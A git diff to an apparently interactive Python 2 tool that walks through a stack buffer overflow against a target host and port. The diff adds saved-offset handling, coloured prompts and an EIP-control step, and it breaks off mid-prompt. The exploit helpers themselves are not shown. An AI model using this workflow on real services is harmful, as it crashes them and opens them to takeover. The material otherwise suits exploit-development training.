@@ -4,6 +4,7 @@ from functions import *
 dataDict = dict()
 changeData = False
 fuzzingSkip = False
+findEIPSkip = False
 
 if os.path.exists("save-buffer-overflow.csv"):
     with open("save-buffer-overflow.csv", "r+") as file:
@@ -14,13 +15,15 @@ if os.path.exists("save-buffer-overflow.csv"):
                 aff = "Taget"
                 aff2 = "IP"
             else:
-                aff = key
+                aff = key.capitalize()
                 aff2 = key
             if key != "host" and key != "port" and key != "page":
                 if key == "lenCrash":
-                    fuzzingSkip = query_yes_no("The target crash at {} bytes. Do you want skip fuzzing?".format(value))
+                    fuzzingSkip = query_yes_no("The target crash at "+ CBLUE2 + value + CEND +" bytes. Do you want skip fuzzing?")
+                if key == "offset":
+                    findEIPSkip = query_yes_no("The offset is "+ CBLUE2 + value + CEND +" bytes. Do you want to skip the offset search?")
             else:
-                goodValue = query_yes_no("{} is : {}, do you want to keep it?".format(aff.capitalize(), value), default="yes")
+                goodValue = query_yes_no(aff + " is : "+ CBLUE2 + value + CEND +", do you want to keep it?", default="yes")
             if not goodValue:
                 changeData = True
                 changeValue = str(raw_input("Please enter the new {} : ".format(aff2)))
@@ -76,12 +79,18 @@ if not fuzzingSkip:
             writer = csv.writer(file)
             writer.writerow(["lenCrash", dataDict['lenCrash']])
             file.close()
-            
-if query_yes_no("Do not forget to restart the service, if it has crashed. Do you want start the second step to find EIP?"):
-    offset = findEIP(buffer, dataDict["lenCrash"], dataDict['host'], int(dataDict['port']))
-    if offset != 0:
-        dataDict['offset'] = offset
-        with open("save-buffer-overflow.csv", "a+") as file:
-            writer = csv.writer(file)
-            writer.writerow(["offset", dataDict['offset']])
-            file.close()
+
+if not findEIPSkip:           
+    if query_yes_no(CYELLOW + "Do not forget to restart the service, if it has crashed"+ CEND +". Do you want start the second step to find EIP?"):
+        offset = findEIP(buffer, dataDict["lenCrash"], dataDict['host'], int(dataDict['port']))
+        if offset != 0:
+            dataDict['offset'] = offset
+            with open("save-buffer-overflow.csv", "a+") as file:
+                writer = csv.writer(file)
+                writer.writerow(["offset", dataDict['offset']])
+                file.close()
+                
+    if query_yes_no("Do you want control EIP offset?"):
+        eipGood = controlEIP(buffer, int(dataDict["offset"]), int(dataDict["lenCrash"]), dataDict['host'], int(dataDict['port']))
+        if not eipGood:
+            query_yes_no("Do you want")
